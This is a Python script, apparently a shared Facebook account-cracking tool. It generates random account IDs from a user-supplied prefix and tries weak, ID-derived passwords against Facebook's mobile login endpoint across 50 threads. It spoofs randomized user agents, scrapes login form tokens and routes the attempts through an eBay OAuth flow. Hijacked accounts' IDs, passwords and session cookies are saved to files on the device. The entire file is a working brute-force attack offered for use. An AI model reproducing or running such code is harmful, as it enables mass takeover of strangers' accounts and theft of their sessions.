#si6xd
import os
import sys
import re
import time
import random
import string
import requests
from concurrent.futures import ThreadPoolExecutor
R = '\x1b[1;91m' 
G = '\x1b[1;92m' 
Y = '\x1b[1;93m'
O = '\x1b[1;98m'
B = '\033[1;34m'
W = '\033[1;97m'
ugnn = []
pc = random.choice(['Windows NT 6.1; WOW64','X11; CrOS x86_64 8172.45.0','Windows NT 10.0; Win64; x64','X11; Linux x86_64'])
for Xr in range (9999):    
    a=f"Mozilla/5.0 ("+pc+""
    b=random.randrange(6, 12)
    c=random.randrange(3, 13)
    d='Build/'
    e=random.choice(["MMB29M","LRX22G","MRA58K","LMY47D"])
    f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    g=random.randrange(80,100)
    h='0'
    i=random.randrange(4200,4900)
    j=random.randrange(40,150)
    k='Safari/537.36'
    l=random.choice(["UCBrowser","VenusBrowser","HiBrowser","HeadlessChrome","PaleMoon","OPR","Edge","Viabrowser"])
    #l=random.choice(["VenusBrowser","HiBrowser","HeadlessChrome"])
    m=random.randrange(1,9)
    n=random.randrange(1,9)
    o='0'
    p=random.randrange(5,20)
    uaku=(f'{a}) {f}{g}.{h}.{i}.{j} {k}') #/{m}.{n}.{o}.{p}')
    ugnn.append(uaku)
ugn = []
realme = random.choice(['M910x','D10i','2PXH3','D830x','U-2u','M910x','2PXH3','HTC_Desire_S_S510e','HTC_0P3P5','HTC_DesireHD_X315e','HTC_C715c','HTC_D616w'])
#Mozilla/5.0 (Linux; Android 6; SM-G781) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5215.119 Mobile Safari/537.36'
for Xr in range (9999):    
    a='Mozilla/5.0 (Linux; Android'
    b=random.randrange(6, 12)
    c=random.randrange(3, 13)
    d='Build/'
    e=random.choice(["MMB29M","LRX22G","MRA58K","LMY47D"])
    f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    g=random.randrange(80,100)
    h='0'
    i=random.randrange(4200,4900)
    j=random.randrange(40,150)
    k='Mobile Safari/537.36'
    l=random.choice(["UCBrowser","VenusBrowser","HiBrowser","HeadlessChrome","PaleMoon","OPR","Edge","Viabrowser"])
    #l=random.choice(["VenusBrowser","HiBrowser","HeadlessChrome"])
    m=random.randrange(1,9)
    n=random.randrange(1,9)
    o='0'
    p=random.randrange(5,20)
    uaku=(f'{a} {b}; {realme} {d}{e}) {f}{g}.{h}.{i}.{j} {k}') #/{m}.{n}.{o}.{p}')
    ugn.append(uaku)
loop = 0
oks = []
gen = []
logo = ("""
	\033[1;97m
  .d88b  .d8b.  d8888b. db    db d888888b .d8888. 
   `8P' d8' `8b 88  `8D 88    88   `88'   88'  YP \033
    ~88  88ooo88 88oobY' Y8    8P    88    `8bo.~  
    88  88~~~88 88`8b   `8b  d8'    88      `Y8b. 
db. 88  88   88 88 `88.  `8bd8'    .88.   db   8D 
Y8888P  YP   YP 88   YD    YP    Y888888P `8888Y'
              \x1b[1;91m—————— \x1b[1;97m[<MAIN4K - TEST1>] \x1b[1;91m——————
\033[1;97m———————————————————————————————————————————————""")

def main():
    os.system('clear')
    print(logo)
    code = input(f'{Y}[{W}?{Y}] {W}Input Code : ')
    limit = input(f'{Y}[{W}?{Y}] {W}total id : ')
    for a in range(int(limit)):
        awm = "".join(random.choice(string.digits) for _ in range(6))
        gen.append(awm)
    with ThreadPoolExecutor(max_workers=50) as Submits:
        print(47*"\x1b[1;97m—") 
        for next in gen:
            ids = code + next
            mk = ids[:6]
            xx = ids[:7]
            v = ids[:8]
            b = next[:6]  
            passlist = [mk,xx,b,'57273200',v]
            Submits.submit(cracker,ids,passlist)

def values(url=None):
    code = {}
    session = requests.Session()
    try:
        response = session.get(url).text
        jazoest = re.search(r'name="jazoest" value="(.*?)"', response)
        m_ts = re.search(r'name="m_ts" value="(.*?)"', response)
        lsd = re.search(r'name="lsd" value="(.*?)"', response)
        li = re.search(r'name="li" value="(.*?)"', response)
        __dyn = re.search(r'name="__dyn" value="(.*?)"', response)
        __csr = re.search(r'name="__csr" value="(.*?)"', response)
        __a = re.search(r'name="__a" value="(.*?)"', response)
        bi_wvdp = re.search(r'name="bi_wvdp" value="(.*?)"', response)
        
        code['li'] = li.group(1) if li else random.choice(['GosCZzoF-x4TPnttnppf6vQM' 'G4sCZ-e-gi91jL0vyyhgRvVO', 'HIsCZwuKjhSwv0KKTgpDapfT', 'HosCZ7N677bvIn23tMfXsv06'])
        code['lsd'] = lsd.group(1) if lsd else random.choice(['AVoXhSMaYhc', 'AVqPPp5vKyU', 'AVoE8plKK3k'])
        code['m_ts'] = m_ts.group(1) if m_ts else str(int(time.time()))
        code['jazoest'] = jazoest.group(1) if jazoest else str(random.randint(1000, 9000))
    
    except Exception as e:
        pass
    
    return code

def cracker(ids,passlist):
    global loop,oks
    sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
    sys.stdout.flush()
    try:
        for pas in passlist:
            moz = random.choice(ugn)
            mr_code = values("https://m.facebook.com/login.php?skip_api_login=1&api_key=159693524730858&kid_directed_site=0&app_id=159693524730858&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Flocale%3Den_US%26client_id%3D159693524730858%26scope%3Demail%26redirect_uri%3Dhttps%253A%252F%252Fsignin.ebay.com%252Fsignin%252Ffb%252Fcb%26state%3Ddl4xLjEjaV4xI3JeMSNwXjEjSV4zI2ZeMCN0XlVsNDFYems2UlVNMFFUZ3pNMFpCTURNMU5UUXdOVFpETURReE9FVTVSVU5GTVRNeU5URmZNVjh4STBWZU1qWXc%253D%257C%257CAQAJAAAAUKXnAXFO_1KI4a1RqK2_eVTLroviDJxDQ8bPtE7iGgKC24Uht6XmdE36DQkrGtZVKw_z-JtoJ1QvK_bYeJTECeBL2T2MUaoVvVmL-UwF--5i%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0efb56bd-7614-4b4a-be5b-ffe7bac828f9%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsignin.ebay.com%2Fsignin%2Ffb%2Fcb%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Ddl4xLjEjaV4xI3JeMSNwXjEjSV4zI2ZeMCN0XlVsNDFYems2UlVNMFFUZ3pNMFpCTURNMU5UUXdOVFpETURReE9FVTVSVU5GTVRNeU5URmZNVjh4STBWZU1qWXc%253D%257C%257CAQAJAAAAUKXnAXFO_1KI4a1RqK2_eVTLroviDJxDQ8bPtE7iGgKC24Uht6XmdE36DQkrGtZVKw_z-JtoJ1QvK_bYeJTECeBL2T2MUaoVvVmL-UwF--5i%23_%3D_&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated&_rdr")
            data = {
            'jazoest': mr_code.get('jazoest'),
            'lsd': mr_code.get('lsd'),
            'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0',
            #'login_source': 'comet_headerless_login',
            'next': 'https://m.facebook.com/privacy/consent/gdp/?params%5Bapp_id%5D=159693524730858&params%5Bkid_directed_site%5D=false&params%5Blogger_id%5D=%222d2675b3-6669-4a73-addc-7389cea68113%22&params%5Bnext%5D=%22read%22&params%5Bredirect_uri%5D=%22https%3A%5C%2F%5C%2Fsignin.ebay.com%5C%2Fsignin%5C%2Ffb%5C%2Fcb%22&params%5Breturn_scopes%5D=false&params%5Bscope%5D=%5B%22email%22%5D&params%5Bstate%5D=%22dl4xLjEjaV4xI0leMyNyXjEjZl4wI3BeMSN0XlVsNDFYek02T1VKRk9VVTRNekUyUXpJMFF6RTVPVEV5TVRJeU56WTJPVVkwTXpjM09FWmZNbDh4STBWZU1qWXc%3D%7C%7CAQAJAAAAUKXnAXFO_1KI4a1RqK2_eVTLroviDJxDQ8bPtE7iGgKCKqpD4Sky4V8rLeoVtVoR9KmG7kvWMzSh7zBLQ6QgfiHq8vfmfQYZrfKSsKvyYLtj%22&params%5Bsteps%5D=%7B%22read%22%3A%5B%22email%22%2C%22baseline%22%2C%22public_profile%22%5D%7D&params%5Btp%5D=%22unspecified%22&params%5Bcui_gk%5D=%22%5BPASS%5D%3A%22&params%5Bis_limited_login_shim%5D=false&source=gdp_delegated&_rdr',
            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),
             '__dyn': mr_code.get('__dyn'), '__csr': mr_code.get('__csr'), '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__a': mr_code.get('__a'),  '__user': '0',
            }
            headers = { 'Host': 'm.facebook.com',
    'accept': '*/*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'dbln=%7B%22100034166328492%22%3A%22HXjyP4ZQ%22%7D; datr=G1b5ZerHgdntYLxRjgCXuL5u; sb=G1b5ZTWmCb1xEcweiJl4hEPD; ps_n=1; ps_l=1; locale=bn_IN; vpd=v1%3B798x407x3; wl_cbv=v2%3Bclient_version%3A2655%3Btimestamp%3A1729780217; m_pixel_ratio=3; wd=407x798; fr=0iQNkSbBuU2aApgeW.AWXbWxQ8whqbiDzgoB6LjvQngkc.Bl-c9M..AAA.0.0.BnGl8m.AWVJzoH0Ulg',
    'origin': 'https://m.facebook.com',
    'referer': 'https://m.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': moz,
    'x-asbd-id': '129477',
    'x-fb-lsd': mr_code.get('lsd'),
    'x-requested-with': 'XMLHttpRequest',
    'x-response-format': 'JSONStream',}
            url = "https://m.facebook.com/login/device-based/login/async/?api_key=159693524730858&auth_token=a5881e5d5022604173d0e77730ea48c3&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Flocale%3Den_US%26client_id%3D159693524730858%26scope%3Demail%26redirect_uri%3Dhttps%253A%252F%252Fsignin.ebay.com%252Fsignin%252Ffb%252Fcb%26state%3Ddl4xLjEjaV4xI3BeMSNyXjEjZl4wI0leMyN0XlVsNDFYekE2UWpkQ016azBRekkxTkRZMVEwUkZSREpDUXpORlFVSkROelpDTkVaRVFrWmZNbDh4STBWZU1qWXc%253D%257C%257CAQAJAAAAUKXnAXFO_1KI4a1RqK2_eVTLroviDJxDQ8bPtE7iGgKCndFKuR_uUr6gTPA9V1-ZCjB-od2a2czj4V9R_VtD4ESeRG_YogFonZUSme0M7Nog%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D55451f2f-d049-47c4-85b0-8614e9c76530%26tp%3Dunspecified&refsrc=deprecated&app_id=159693524730858&cancel=https%3A%2F%2Fsignin.ebay.com%2Fsignin%2Ffb%2Fcb%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Ddl4xLjEjaV4xI3BeMSNyXjEjZl4wI0leMyN0XlVsNDFYekE2UWpkQ016azBRekkxTkRZMVEwUkZSREpDUXpORlFVSkROelpDTkVaRVFrWmZNbDh4STBWZU1qWXc%253D%257C%257CAQAJAAAAUKXnAXFO_1KI4a1RqK2_eVTLroviDJxDQ8bPtE7iGgKCndFKuR_uUr6gTPA9V1-ZCjB-od2a2czj4V9R_VtD4ESeRG_YogFonZUSme0M7Nog%23_%3D_&lwv=100"
            #print(data)
            #print(headers)
            response = requests.Session().post(url,data=data,headers=headers,allow_redirects = False)
            if "c_user" in response.cookies.get_dict():
                coki=";".join([key+"="+value for key,value in  response.cookies.get_dict().items() ])
                user = re.findall('c_user=(.*);fr', coki)[0]
                print('\033[1;92m [JARVIS-OK] '+user+' | '+pas+' | '+coki+'')
                open("/sdcard/ok.txt","a").write(user+"|"+pas+"|"+coki+"\n")
                oks.append(ids)
                break
            elif "checkpoint" in response.cookies.get_dict():
                coki = (";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items() ])
                cid = coki[24:39]
                print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
                open('/sdcard/CP.txt', 'a').write( ids+' | '+pas+' \n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except:pass

main()
